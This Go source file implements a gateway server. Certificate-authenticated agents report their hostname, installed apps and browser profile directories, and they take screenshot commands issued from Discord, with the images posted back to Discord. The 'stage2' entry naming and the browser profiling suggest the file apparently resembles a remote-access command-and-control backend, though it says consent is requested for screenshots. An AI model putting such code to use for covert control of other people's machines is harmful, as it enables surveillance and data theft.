package transport

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"google.golang.org/protobuf/types/known/timestamppb"

	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/broker"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/identity"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider"
	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
)

type Server struct {
	broker         *broker.NATS
	notifier       *provider.Fanout
	commandQueue   *command.Queue
	discordPoster  provider.DiscordPoster
	statusProvider agentStatusProvider
	engine         *gin.Engine

	seenMu     sync.Mutex
	seenAgents map[string]struct{}
}

type agentStatusProvider interface {
	Snapshot(agentID string) (provider.AgentSnapshot, bool)
}

func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.Queue, discordPoster provider.DiscordPoster, statusProvider agentStatusProvider) *Server {
	if notifier == nil {
		notifier = provider.NewFanout(nil)
	}

	s := &Server{
		broker:         b,
		notifier:       notifier,
		commandQueue:   commandQueue,
		discordPoster:  discordPoster,
		statusProvider: statusProvider,
		engine:         gin.Default(),
		seenAgents:     make(map[string]struct{}),
	}
	s.routes()
	return s
}

func (s *Server) routes() {
	s.engine.Use(func(c *gin.Context) {
		if c.Request.TLS != nil && len(c.Request.TLS.PeerCertificates) > 0 {
			cert := c.Request.TLS.PeerCertificates[0]
			authenticatedAgent, err := identity.FromPeerCertificate(cert)
			if err != nil {
				c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid client certificate identity"})
				return
			}

			c.Set("agent_id", authenticatedAgent.ID)
			c.Set("agent_cert_fingerprint_sha256", authenticatedAgent.FingerprintSHA256)
			c.Set("agent_subject_cn", authenticatedAgent.SubjectCommonName)
		} else {
			c.AbortWithStatusJSON(403, gin.H{"error": "mTLS required"})
			return
		}
		c.Next()
	})

	s.engine.POST("/ingest/heartbeat", s.handleHeartbeat)
	s.engine.POST("/ingest/entry", s.handleEntry)
	s.engine.GET("/commands/next", s.handleNextCommand)
	s.engine.POST("/commands/result", s.handleCommandResult)
}

func (s *Server) handleHeartbeat(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var hb pb.Heartbeat
	if err := c.ShouldBindJSON(&hb); err != nil {
		c.JSON(400, gin.H{"error": "Invalid schema"})
		return
	}

	// Construct Trusted Envelope
	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"), // Or generate new
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(), // In real app, cache this
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_Heartbeat{Heartbeat: &hb},
	}

	// Publish to NATS: sys.in.us-east.agent-555.heartbeat
	subject := "sys.in.default." + agentID + ".heartbeat"
	if err := s.broker.Publish(subject, env); err != nil {
		c.JSON(500, gin.H{"error": "Failed to queue event"})
		return
	}

	_, existed := s.markSeen(agentID)

	c.JSON(202, gin.H{
		"status":       "accepted",
		"event_id":     env.EventId,
		"is_new_agent": !existed,
	})
}

type entryBrowser struct {
	Name       string `json:"name"`
	BinaryPath string `json:"binary_path"`
	ProfileDir string `json:"profile_dir"`
}

type entryRequest struct {
	Hostname              string         `json:"hostname" binding:"required"`
	OSVersion             string         `json:"os_version"`
	IsNewAgent            bool           `json:"is_new_agent"`
	Browsers              []entryBrowser `json:"browsers"`
	InstalledApplications []string       `json:"installed_applications"`
}

func (s *Server) handleEntry(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req entryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	report := normalizeEntryRequest(agentID, req)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.New(report.OccurredAt),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.ingest.entry",
			Message: fmt.Sprintf(
				"stage2 entry accepted hostname=%s browsers=%d apps=%d is_new_agent=%t",
				report.Hostname,
				len(report.Browsers),
				len(report.InstalledApplications),
				report.IsNewAgent,
			),
		}},
	}

	subject := "sys.in.default." + agentID + ".entry"
	if err := s.broker.Publish(subject, env); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	if err := s.notifier.ReportEntry(c.Request.Context(), report); err != nil {
		log.Printf("⚠️ entry notification failed agent=%s: %v", agentID, err)
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

func (s *Server) handleNextCommand(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	if s.commandQueue == nil {
		c.Status(http.StatusNoContent)
		return
	}

	cmd := s.commandQueue.Dequeue(agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	c.JSON(http.StatusOK, cmd)
}

type commandResultRequest struct {
	CommandID      string `json:"command_id" binding:"required"`
	Type           string `json:"type" binding:"required"`
	Status         string `json:"status" binding:"required"`
	Reason         string `json:"reason"`
	UserApproved   bool   `json:"user_approved"`
	DisconnectNow  bool   `json:"disconnect_now"`
	ClientHostname string `json:"client_hostname"`
	OutputData     []byte `json:"output_data,omitempty"`
}

func (s *Server) handleCommandResult(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req commandResultRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	message := fmt.Sprintf(
		"command_result command_id=%s type=%s status=%s approved=%t disconnect_now=%t hostname=%s reason=%s output_bytes=%d",
		clampText(req.CommandID, 128),
		clampText(req.Type, 64),
		clampText(req.Status, 32),
		req.UserApproved,
		req.DisconnectNow,
		clampText(req.ClientHostname, 120),
		clampText(req.Reason, 512),
		len(req.OutputData),
	)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.command.audit",
			Message:   message,
		}},
	}

	subject := "sys.in.default." + agentID + ".command.audit"
	if err := s.broker.Publish(subject, env); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	if len(req.OutputData) > 0 && s.discordPoster != nil {
		s.forwardScreenshotToDiscord(c.Request.Context(), agentID, req)
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

func (s *Server) forwardScreenshotToDiscord(ctx context.Context, agentID string, req commandResultRequest) {
	channelID, ok := s.discordPoster.CommandsChannelID(agentID)
	if !ok {
		log.Printf("⚠️ no discord commands channel found for agent=%s, cannot forward screenshot", agentID)
		return
	}

	if req.Status != "executed" {
		s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("❌ Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
		return
	}

	if len(req.OutputData) == 0 {
		s.discordPoster.SendChannelMessage(ctx, channelID, "❌ Screenshot returned empty data")
		return
	}

	fileName := fmt.Sprintf("screenshot_%s.png", time.Now().UTC().Format("20060102_150405"))
	caption := fmt.Sprintf("📸 Screenshot captured from **%s** (command: `%s`)", req.ClientHostname, req.CommandID)
	if err := s.discordPoster.SendChannelFile(ctx, channelID, fileName, req.OutputData, caption); err != nil {
		log.Printf("⚠️ failed to post screenshot to discord for agent=%s: %v", agentID, err)
	}
}

var helpText = "**Available Commands**\n\n" +
	"`!help` / `!h`\n" +
	"Show this help message\n\n" +
	"`!status`\n" +
	"Show agent connection status (online, hostname, last seen)\n\n" +
	"`!screenshot` / `!ss`\n" +
	"Request a screenshot from the agent"

func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, args []string, userName string) error {
	if s.discordPoster == nil {
		return nil
	}

	switch command {
	case "help", "h":
		return s.discordPoster.SendChannelMessage(ctx, channelID, helpText)
	case "status":
		return s.handleDiscordStatus(ctx, agentID, channelID)
	case "screenshot", "ss":
		return s.handleDiscordScreenshot(ctx, agentID, channelID, userName)
	default:
		return s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Unknown command `!%s`. Try `!help`.", command))
	}
}

func (s *Server) handleDiscordStatus(ctx context.Context, agentID, channelID string) error {
	if s.statusProvider == nil {
		return s.discordPoster.SendChannelMessage(ctx, channelID, "Status provider not available")
	}

	snapshot, ok := s.statusProvider.Snapshot(agentID)
	if !ok {
		return s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Agent `%s` has never connected or has been offline for too long.", agentID))
	}

	ts := snapshot.LastSeen.UTC().Format("Mon Jan 02 2006 15:04:05 UTC")
	statusEmoji := "🟢"
	statusText := "Online"
	if !snapshot.IsOnline {
		statusEmoji = "🔴"
		statusText = "Offline"
	}

	msg := fmt.Sprintf(
		"**Agent Status**\n%s **%s**\n**Hostname:** %s\n**Agent ID:** `%s`\n**Last Seen:** %s",
		statusEmoji, statusText, snapshot.Hostname, agentID, ts,
	)
	return s.discordPoster.SendChannelMessage(ctx, channelID, msg)
}

func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID, userName string) error {
	if s.commandQueue == nil {
		return s.discordPoster.SendChannelMessage(ctx, channelID, "Command queue not available")
	}

	s.commandQueue.Enqueue(agentID, &command.Envelope{
		Type:        "support.request_screenshot",
		RequestedBy: userName,
		Reason:      fmt.Sprintf("Screenshot requested by %s via Discord", userName),
	})

	return s.discordPoster.SendChannelMessage(ctx, channelID,
		fmt.Sprintf("📸 Screenshot request queued for agent `%s`. The agent will be prompted for consent on the next poll cycle.", agentID))
}

func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
	s.seenMu.Lock()
	defer s.seenMu.Unlock()

	_, existed = s.seenAgents[agentID]
	if !existed {
		s.seenAgents[agentID] = struct{}{}
		return true, false
	}

	return false, true
}

func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryReport {
	const (
		maxApps     = 200
		maxBrowsers = 32
	)

	browsers := make([]provider.BrowserInfo, 0, len(req.Browsers))
	for _, b := range req.Browsers {
		if len(browsers) >= maxBrowsers {
			break
		}

		name := clampText(b.Name, 80)
		if name == "" {
			continue
		}

		browsers = append(browsers, provider.BrowserInfo{
			Name:       name,
			BinaryPath: clampText(b.BinaryPath, 260),
			ProfileDir: clampText(b.ProfileDir, 260),
		})
	}

	apps := make([]string, 0, len(req.InstalledApplications))
	for _, app := range req.InstalledApplications {
		if len(apps) >= maxApps {
			break
		}

		item := clampText(app, 120)
		if item == "" {
			continue
		}
		apps = append(apps, item)
	}

	return provider.EntryReport{
		AgentID:               agentID,
		Hostname:              clampText(req.Hostname, 120),
		OSVersion:             clampText(req.OSVersion, 120),
		IsNewAgent:            req.IsNewAgent,
		Browsers:              browsers,
		InstalledApplications: apps,
		OccurredAt:            timestamppb.Now().AsTime(),
		Source:                "entry",
	}
}

func clampText(value string, limit int) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	if len(trimmed) <= limit {
		return trimmed
	}
	return trimmed[:limit]
}

func (s *Server) Run(addr, certPath string) error {
	// Load CA to verify clients
	caCert, err := os.ReadFile(certPath + "/ca.crt")
	if err != nil {
		return fmt.Errorf("read CA certificate: %w", err)
	}
	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCert); !ok {
		return fmt.Errorf("parse CA certificate: invalid PEM")
	}

	tlsConfig := &tls.Config{
		ClientCAs:  caCertPool,
		ClientAuth: tls.RequireAndVerifyClientCert, // STRICT mTLS
		MinVersion: tls.VersionTLS13,
	}

	server := &http.Server{
		Addr:      addr,
		Handler:   s.engine,
		TLSConfig: tlsConfig,
	}
	return server.ListenAndServeTLS(certPath+"/server.crt", certPath+"/server.key")
}
